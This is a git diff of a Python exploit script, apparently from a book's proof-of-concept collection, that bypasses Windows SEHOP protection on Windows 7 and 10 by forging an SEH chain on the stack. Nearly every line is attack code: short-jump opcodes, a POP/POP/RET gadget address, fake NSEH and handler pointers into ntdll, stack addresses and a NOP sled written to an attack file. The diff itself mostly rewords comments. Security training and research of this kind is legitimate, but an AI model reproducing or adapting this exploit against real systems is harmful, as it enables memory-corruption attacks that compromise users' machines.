@@ -1,10 +1,13 @@
-# Exploit to bypass the Structured Exception Handling Overwrite Protection
-# (SEHOP) by crafting a fake SEH chain on the stack.
+# Exploit to bypass Structured Exception Handling Overwrite Protection (SEHOP)
+# by crafting a fake SEH chain on the stack.
 #
 # Tested on Microsoft Windows 7 Ultimate (6.1.7601 Service Pack 1 Build 7601)
 #       and Microsoft Windows 10 Pro (10.0.17134 N/A Build 17134)
 #
 # Crafted with love by e3prom (github.com/e3prom).
+#
+# PoC codes and more available at:
+# https://github.com/e3prom/miscsec/tree/master/GHHv5-SEHOP-Bypass
 import struct
 from ctypes import windll
 
@@ -25,23 +28,29 @@ def loadDLL(dll_name):
 def findFinalEH(target_os):
     if target_os == 0:
         # On Windows 7, the handler address seems to be static even with ASLR.
-        # The below offset may be different on your target operating system version.
+        # The below offset may be different on your target operating system.
         return loadDLL("ntdll.dll") + 0xBAC12
     elif target_os == 1:
-        # On Windows 10, the last byte seems to be randomized in a +/- 20 bytes range.
-        # You may need to launch the exploit multiple times to hit the correct handler address.
+        # On Windows 10, the last byte seems to be randomized in a +/- 30 bytes
+        # range. You may need to launch the exploit multiple times to hit the
+        # correct handler address.
         return loadDLL("ntdll.dll") + 0x7EC21
 
 def main():
     file = 'attack.bin'
 
     jmp1 = "\xEB\x0D\x90\x90"
-    jmp2 = "\xEB\x0A\x90"                       # operand value '0xA' will null terminate, so we remove one byte.
-    seh = struct.pack("<L", 0x10001004)         # XOR EAX,EAX # POP EDI # POP EBP # RETN
+    jmp2 = "\xEB\x0A\x90"                       # operand value '0xA' will
+                                                # null-terminate, so we remove one byte.
+    seh = struct.pack("<L", 0x10001004)         # XOR EAX,EAX
+						# POP EDI
+						# POP EBP
+						# RETN
     fake_nseh = struct.pack("<L", 0xFFFFFFFF)   # Fake NSEH pointer.
-    fake_seh = struct.pack("<L", findFinalEH(target_os)) # Fake SEH handler to ntdll!FinalExceptionHandler.
+    fake_seh = struct.pack("<L", findFinalEH(target_os)) # Fake SEH handler.
     if target_os == 0:
-        nseh = struct.pack("<L", 0x0012F974)    # jump back on the stack toward lower memory addresses.
+        nseh = struct.pack("<L", 0x0012F974)    # jump back on the stack toward
+						# lower memory addresses.
         nopsled = "\x90" * 84
     elif target_os == 1:
         nseh = struct.pack("<L", 0x0019F974)    # On Win10 the stack is aligned a little bit differently.
